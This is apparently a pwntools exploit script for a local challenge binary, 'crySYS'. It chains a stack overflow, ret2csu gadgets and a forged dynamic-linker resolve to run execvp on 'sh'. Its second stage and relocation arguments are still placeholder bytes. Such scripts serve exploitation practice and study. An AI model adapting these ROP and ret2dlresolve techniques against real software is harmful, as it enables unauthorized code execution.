from pwn import *

# setup general settings
context.terminal = ["xfce4-terminal", "--disable-server", "-e"]
context.arch = "amd64"

# spawn process, and read elf file
p = process("./crySYS")
bin_elf = ELF("./crySYS")


RESOLVER_ADDR = 0x4003E6 # call dl_resolve wihtout pushing link_map
# we need to create our own link_map and reloc_arg
# RESOLVER_ADDR = 0x4003E0 # push link_map and call dl_resolve
# using 0x4003E0, we dont control and modify the link_map argument
C_AREA        = 0x601030 # controllable area (bss segment)

# resolve structure offsets
SYMTAB = 0x4002B8
STRTAB = 0x400318
JMPREL = 0x4003B0

################# First Stage ##################################################
""" ropchain via ret2csu for another read call on a known address, this
    read we will pass our forged JMPREL struct and SYMTAB struct
    
    read(0, buf, 0x100) -> read(rdi, rsi, rdx)
"""

# calling read using ret2csu -> call [r12+rbx*8]
# we write the got address of read into r12 and clear rbx

# ROP gadgets
CSU_RET    = 0x40057A
'''
.text:000000000040057A 5B             pop     rbx
.text:000000000040057B 5D             pop     rbp
.text:000000000040057C 41 5C          pop     r12
.text:000000000040057E 41 5D          pop     r13
.text:0000000000400580 41 5E          pop     r14
.text:0000000000400582 41 5F          pop     r15
.text:0000000000400584 C3             retn
'''

CSU_CALL = 0x400560
'''
.text:0000000000400560 4C 89 FA             mov  rdx, r15
.text:0000000000400563 4C 89 F6             mov  rsi, r14
.text:0000000000400566 44 89 EF             mov  edi, r13d
.text:0000000000400569 41 FF 14 DC          call [r12+rbx*8]
'''

RELOC_READ = 0x601018

chain_read  = b""
chain_read += b"A"*80                   # overflow padding
chain_read += b"B"*8                    # fake rbp
chain_read += p64(CSU_RET)              # gadget (see above)
chain_read += p64(0)                    # RBX
chain_read += p64(1)                    # RBP (to pass cmp rbp, rbx after call)
chain_read += p64(RELOC_READ)           # R12 (read GOT entry)
chain_read += p64(0)                    # R13 (has to be zero for stdin read)
chain_read += p64(C_AREA)               # R14 (ptr to controlable buffer)
chain_read += p64(0x100)                # R15 (amount we want to read)
chain_read += p64(CSU_CALL)
chain_read += b"D"*8                    # to counter (add rsp,8) after call



# ROP gadgets for setting up parameters of execvp
POP_RDI = 0x400583               # set sh\x00 string address
'''
.text:0000000000400583 5F             pop     rdi
.text:0000000000400584 C3             retn
'''

POP_RSI_POP_R15_RET = 0x400581   # set argv to a null ptr
'''
.text:0000000000400581 5E             pop     rsi
.text:0000000000400582 41 5F          pop     r15
.text:0000000000400584 C3             retn
'''

chain_read += b"P"*8*6                  # Padding
chain_read += p64(POP_RDI)              # set execvp file arg
chain_read += p64(C_AREA)               # sh string
chain_read += p64(POP_RSI_POP_R15_RET)  # empty args str
chain_read += p64(C_AREA+2)             # null ptr arg to execvp
chain_read += b"R"*8                    # dummy r15
chain_read += p64(RESOLVER_ADDR)        # call resolver
chain_read += b"T"*8                    # reloc_index arg
chain_read += b"U"*8                    # reloc_index arg
chain_read += b"E"*16                   # end of chain

# hopefully pops shell after here :D


################# Final Stage ##################################################
""" sending everything to the process """


# attaching radare for debugging
#offset = 0x400505     # bp at leave
offset = 0x400506     # bp at ret
gdb.attach(p, r2cmd="db {}".format(hex(offset)))

# Send first stage and third stage payload, read ROP-chain plus resolver call
p.send(chain_read)

# waiting for the first stage to read the forged structs
raw_input("wait for second read")

# Send second stage, forged structs
p.send(b"F"*64)


# keep process alive
p.interactive()

